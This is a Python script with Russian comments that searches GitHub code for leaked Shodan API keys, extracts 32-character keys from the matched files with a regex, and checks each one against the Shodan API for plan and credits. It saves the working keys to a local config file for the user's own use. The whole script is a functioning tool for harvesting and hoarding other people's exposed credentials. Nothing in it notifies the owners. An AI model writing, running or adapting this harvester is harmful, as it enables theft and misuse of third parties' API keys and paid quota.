import os
import json
import re
import requests
import shodan
from concurrent.futures import ThreadPoolExecutor

CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
    "github_token": "",
    "shodan_keys": [],
    "proxy": ""
}

# ===== КОНФИГУРАЦИЯ =====
def load_or_create_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            config = json.load(f)
    else:
        config = DEFAULT_CONFIG.copy()
        config["github_token"] = input("[?] Введите GitHub Token: ").strip()
        config["proxy"] = input("[?] Введите прокси (или Enter чтобы пропустить): ").strip()
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=4)
        os.chmod(CONFIG_FILE, 0o600)  # Защита файла
    return config

# ===== ОСНОВНАЯ ЛОГИКА =====
def fetch_github_code(query, config):
    headers = {"Authorization": f"token {config['github_token']}"}
    proxies = {"https": config["proxy"]} if config["proxy"] else None
    try:
        response = requests.get(
            f"https://api.github.com/search/code?q={query}",
            headers=headers,
            proxies=proxies,
            timeout=20
        )
        return [item["html_url"] for item in response.json().get("items", [])]
    except Exception as e:
        print(f"[!] GitHub Error: {e}")
        return []

def shodan_key_checker(key):
    try:
        api = shodan.Shodan(key)
        info = api.info()
        return {"key": key, "plan": info["plan"], "credits": info["query_credits"]}
    except:
        return None

# ===== ИНТЕРФЕЙС =====  
def main():
    config = load_or_create_config()
    
    # Автоматический поиск + проверка ключей
    print("\n[+] Поиск утечек на GitHub...")
    sources = []
    for query in ['"ShodanAPIKey" language:python', '"shodan_api_key" filename:.env']:
        sources += fetch_github_code(query, config)
    
    print(f"[+] Анализ {len(sources)} файлов...")
    found_keys = set()
    with ThreadPoolExecutor(15) as executor:
        results = executor.map(lambda url: re.findall(r'shodan_api_key["\']?:\s*["\']([a-zA-Z0-9]{32})', requests.get(url).text), sources)
        for keys in results:
            found_keys.update(keys)
    
    print(f"[+] Проверка {len(found_keys)} ключей...")
    valid_keys = []
    with ThreadPoolExecutor(5) as executor:
        results = executor.map(shodan_key_checker, found_keys)
        for result in results:
            if result:
                valid_keys.append(result)
                if result["key"] not in config["shodan_keys"]:
                    config["shodan_keys"].append(result["key"])
    
    # Сохраняем новые ключи
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)
    
    # Результаты
    print("\n[+] Активные ключи сохранены в config.json:")
    for key in valid_keys:
        print(f"Key: {key['key'][:12]}... | Plan: {key['plan']} | Credits: {key['credits']}")

if __name__ == "__main__":
    main()
